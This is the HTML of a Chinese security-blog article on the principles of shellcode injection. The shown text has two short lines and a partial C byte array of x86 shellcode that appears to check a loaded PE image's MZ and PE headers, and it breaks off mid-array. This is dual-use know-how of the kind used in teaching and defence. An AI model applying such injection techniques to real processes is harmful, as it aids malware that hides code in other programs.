<html>
<head>
<title>ShellCode注入原理</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
ShellCode注入原理
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    一寸一叶
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-11-06</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="margin-right: 8px;margin-bottom: 1.5em;margin-left: 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;" data-mpa-powered-by="yiban.io">shellcode注入原理</p><p style="margin-right: 8px;margin-bottom: 1.5em;margin-left: 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">我们直接写入可能无法执行</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">unsigned</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">char</span><span style="color: rgb(51, 51, 51);"> data</span><span style="color: rgb(51, 51, 51);">[</span><span style="color: rgb(0, 134, 179);">130</span><span style="color: rgb(51, 51, 51);">]</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">{</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x55</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x83</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0C</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x40</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x0F</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xB7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x08</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x81</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF9</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x5A</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x5F</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x55</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF8</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x03</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x42</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x3C</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x89</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x81</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x39</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x50</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x44</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x55</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0F</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xB7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x42</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x18</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x3D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x01</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x32</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x83</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x79</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0E</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x77</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x25</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xBA</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x08</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x6B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC2</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x0E</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x83</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x7C</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x01</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x78</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x09</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF4</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x01</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x07</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC7</span><span style="color: rgb(51, 